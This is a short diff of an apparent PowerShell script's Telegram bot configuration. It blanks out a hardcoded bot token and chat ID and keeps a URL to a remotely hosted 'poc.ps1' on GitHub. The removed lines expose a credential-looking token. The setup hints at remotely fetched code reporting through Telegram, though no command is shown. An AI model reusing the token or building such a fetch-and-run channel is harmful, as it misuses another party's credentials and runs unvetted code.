@@ -20,9 +20,12 @@ BOT TELEGRAM:
 ############
 
 
-$BotToken = "2054624112:AAHLKRU5JattGH67BHN7rXy9GJ4Eu9Ro0w"
-$ChatID = '1350814824'
+$BotToken = ""
+$ChatID = ''
 $githubScript = 'https://raw.githubusercontent.com/rocky428/poc/master/poc.ps1'
+
+
+
 
 ###############
 ## FUNCTIONS ##
